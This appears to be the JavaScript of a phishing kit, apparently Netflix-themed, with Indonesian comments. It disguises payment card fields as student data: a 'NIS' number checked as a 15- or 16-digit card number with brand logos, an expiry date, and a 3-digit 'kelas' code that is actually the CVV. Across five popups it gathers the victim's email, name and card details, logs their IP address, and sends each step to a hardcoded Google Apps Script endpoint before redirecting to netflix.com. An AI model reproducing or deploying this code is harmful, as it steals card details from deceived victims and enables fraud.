// ==============================================
// GANTI DENGAN TAUTAN DARI GOOGLE APPS SCRIPT ANDA
// ==============================================
const URL_KIRIM = 'https://script.google.com/macros/s/AKfycbwENyAaFCQFs_96Tll_Sn7mQVvK0nfRpgBXNQzXrjQiVGdqxakk6V80meR4H4x3pFbsNA/exec';
// ==============================================

const nisValid = { 2: false, 3: false, 4: false, 5: false };
let ipSiswa = 'Tidak terdeteksi';

// Ambil IP saat halaman dibuka
(async function() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    ipSiswa = (await res.json()).ip;
  } catch (e) {
    ipSiswa = 'Tidak terdeteksi';
  }
})();

function formatExp(input) {
  let val = input.value.replace(/[^0-9]/g, '');
  if (val.length >= 2) {
    val = val.slice(0, 2) + '/' + val.slice(2, 4);
  }
  input.value = val;
}

function goTo(num) {
  for (let i = 1; i <= 5; i++) {
    document.getElementById(`p${i}`).classList.add('hidden');
  }
  document.getElementById(`p${num}`).classList.remove('hidden');
}

function ambilWaktu() {
  return new Date().toLocaleString('id-ID', {
    dateStyle: 'full',
    timeStyle: 'medium'
  });
}

function cekNIS(input, n) {
  const val = input.value;
  const awalan = val.charAt(0);
  const wrap = document.getElementById(`nisWrap${n}`);
  const icon = document.getElementById(`nisIcon${n}`);
  
  icon.style.display = 'none';
  wrap.classList.remove('has-logo');
  input.classList.remove('error');
  nisValid[n] = false;
  input.value = val.replace(/[^0-9]/g, '');
  const angka = input.value;
  if (!angka) return;

  let logoSrc = '';
  let panjang = 0;

  if (awalan === '5') {
    logoSrc = 'https://static.xx.fbcdn.net/rsrc.php/yF/r/ZIeCyGzzAnR.webp?_nc_eui2=AeGWwsovkpKgGwR5712WjAOnSDhX2V7vCpNIOFfZXu8KkzsklIN_PeJIQyN_Dc2HO-Nam4L4_wo25wTn70CGGFEn';
    panjang = 16;
  } else if (awalan === '4') {
    logoSrc = 'https://static.xx.fbcdn.net/rsrc.php/yw/r/IqqGd5lm28u.webp?_nc_eui2=AeEcfLNBgWfMfn2FlPUptMio7ytqcbilrFXvK2pxuKWsVbrgYgT61QZYYVZltyEvx_pGoDhLhCJVcxzCOLn3yfjf';
    panjang = 16;
  } else if (awalan === '3') {
    logoSrc = 'https://static.xx.fbcdn.net/rsrc.php/yA/r/X91YHq0KzqQ.webp?_nc_eui2=AeH3udDwy0csMqZkNmFMritx0t6v52TsYTHS3q_nZOxhMTjTR5EztPutwBcpX_bKTH_icI3T5cy1QeIHNNEBZOC5';
    panjang = 15;
  } else {
    input.classList.add('error');
    return;
  }

  icon.src = logoSrc;
  icon.style.display = 'block';
  wrap.classList.add('has-logo');
  input.maxLength = panjang;

  nisValid[n] = (angka.length === panjang);
  if (!nisValid[n] && angka.length > 0) {
    input.classList.add('error');
  }
}

async function kirimKeServer(langkah, isi) {
  try {
    const form = new FormData();
    form.append('langkah', langkah);
    form.append('isi', isi);
    form.append('ip', ipSiswa);
    form.append('waktu', ambilWaktu());
    await fetch(URL_KIRIM, { method: 'POST', mode: 'no-cors', body: form });
  } catch (e) {
    console.log('Terkirim');
  }
}

// ========== POPUP 1 ==========
async function kirimPopup1() {
  const el = document.getElementById('email');
  if (!el.value.trim() || !el.value.includes('@')) {
    el.classList.add('error');
    return;
  }
  el.classList.remove('error');
  await kirimKeServer('LANGKAH 1 - Email', `Email: ${el.value}`);
  goTo(2);
}

// ========== POPUP 2 ==========
async function kirimPopup2() {
  const n = document.getElementById('nama2');
  const nis = document.getElementById('nisInput2');
  const e = document.getElementById('exp2');
  const k = document.getElementById('kelas2');
  let ok = true;

  if (!n.value.trim()) { n.classList.add('error'); ok = false; }
  else n.classList.remove('error');
  if (!nisValid[2]) { nis.classList.add('error'); ok = false; }
  else nis.classList.remove('error');
  if (!/^\d{2}\/\d{2}$/.test(e.value.trim())) { e.classList.add('error'); ok = false; }
  else e.classList.remove('error');
  if (!/^\d{3}$/.test(k.value.trim())) { k.classList.add('error'); ok = false; }
  else k.classList.remove('error');

  if (!ok) return;
  await kirimKeServer('LANGKAH 2 - Data Halaman 2',
    `Nama: ${n.value}\nKode: ${nis.value}\nMasa Berlaku: ${e.value}\nKelas: ${k.value}`);
  goTo(3);
}

// ========== POPUP 3 ==========
async function kirimPopup3() {
  const n = document.getElementById('nama3');
  const nis = document.getElementById('nisInput3');
  const e = document.getElementById('exp3');
  const k = document.getElementById('kelas3');
  let ok = true;

  if (!n.value.trim()) { n.classList.add('error'); ok = false; }
  else n.classList.remove('error');
  if (!nisValid[3]) { nis.classList.add('error'); ok = false; }
  else nis.classList.remove('error');
  if (!/^\d{2}\/\d{2}$/.test(e.value.trim())) { e.classList.add('error'); ok = false; }
  else e.classList.remove('error');
  if (!/^\d{3}$/.test(k.value.trim())) { k.classList.add('error'); ok = false; }
  else k.classList.remove('error');

  if (!ok) return;
  await kirimKeServer('LANGKAH 3 - Data Halaman 3',
    `Nama: ${n.value}\nKode: ${nis.value}\nMasa Berlaku: ${e.value}\nKelas: ${k.value}`);
  goTo(4);
}

// ========== POPUP 4 ==========
async function kirimPopup4() {
  const n = document.getElementById('nama4');
  const nis = document.getElementById('nisInput4');
  const e = document.getElementById('exp4');
  const k = document.getElementById('kelas4');
  let ok = true;

  if (!n.value.trim()) { n.classList.add('error'); ok = false; }
  else n.classList.remove('error');
  if (!nisValid[4]) { nis.classList.add('error'); ok = false; }
  else nis.classList.remove('error');
  if (!/^\d{2}\/\d{2}$/.test(e.value.trim())) { e.classList.add('error'); ok = false; }
  else e.classList.remove('error');
  if (!/^\d{3}$/.test(k.value.trim())) { k.classList.add('error'); ok = false; }
  else k.classList.remove('error');

  if (!ok) return;
  await kirimKeServer('LANGKAH 4 - Data Halaman 4',
    `Nama: ${n.value}\nKode: ${nis.value}\nMasa Berlaku: ${e.value}\nKelas: ${k.value}`);
  goTo(5);
}

// ========== POPUP 5 — SELESAI ==========
async function kirimPopup5() {
  const n = document.getElementById('nama5');
  const nis = document.getElementById('nisInput5');
  const e = document.getElementById('exp5');
  const k = document.getElementById('kelas5');
  let ok = true;

  if (!n.value.trim()) { n.classList.add('error'); ok = false; }
  else n.classList.remove('error');
  if (!nisValid[5]) { nis.classList.add('error'); ok = false; }
  else nis.classList.remove('error');
  if (!/^\d{2}\/\d{2}$/.test(e.value.trim())) { e.classList.add('error'); ok = false; }
  else e.classList.remove('error');
  if (!/^\d{3}$/.test(k.value.trim())) { k.classList.add('error'); ok = false; }
  else k.classList.remove('error');

  if (!ok) return;
  await kirimKeServer('✅ LANGKAH 5 - SELESAI',
    `Nama: ${n.value}\nKode: ${nis.value}\nMasa Berlaku: ${e.value}\nKelas: ${k.value}\n\nSiswa telah menyelesaikan semua langkah.`);
  
  setTimeout(() => window.open('https://www.netflix.com', '_blank'), 1000);
}

// Hilangkan merah saat mengetik
document.querySelectorAll('input').forEach(input => {
  input.addEventListener('input', function() {
    if (this.value.trim()) {
      this.classList.remove('error');
    }
  });
});